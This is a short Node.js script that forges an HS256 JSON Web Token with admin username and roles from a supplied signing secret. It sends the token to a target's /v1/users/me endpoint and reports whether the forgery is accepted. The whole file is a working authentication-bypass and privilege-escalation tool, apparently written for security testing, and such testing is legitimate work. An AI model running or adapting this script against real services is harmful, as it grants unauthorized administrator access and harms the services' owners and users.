// Forge an admin access token with a given secret and test acceptance on the target instance.
// Usage: node jwt-forgery.mjs <baseUrl> <secret> [sub]
import crypto from 'node:crypto';
const [baseUrl, secret, subArg] = process.argv.slice(2);
const sub = Number(subArg || 1);
const b64url = (b) => Buffer.from(b).toString('base64url');
function signHS256(payloadObj, secret) {
  const header = b64url(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const now = Math.floor(Date.now() / 1000);
  const payload = b64url(JSON.stringify({ sub, username: 'admin', roles: ['admin'], permissions: [], type: 'access', iat: now, exp: now + 3600, ...payloadObj }));
  const data = `${header}.${payload}`;
  const sig = crypto.createHmac('sha256', secret).update(data).digest('base64url');
  return `${data}.${sig}`;
}
const token = signHS256({}, secret);
const r = await fetch(`${baseUrl}/v1/users/me`, { headers: { Authorization: `Bearer ${token}` } });
const body = await r.json().catch(() => ({}));
console.log(`forge with secret="${secret}" sub=${sub} -> GET /users/me = ${r.status}`,
  r.status === 200 ? `*** FORGERY ACCEPTED: user=${body.data?.username} roles=${JSON.stringify(body.data?.roles)} ***` : `(rejected: ${JSON.stringify(body.error||body).slice(0,80)})`);
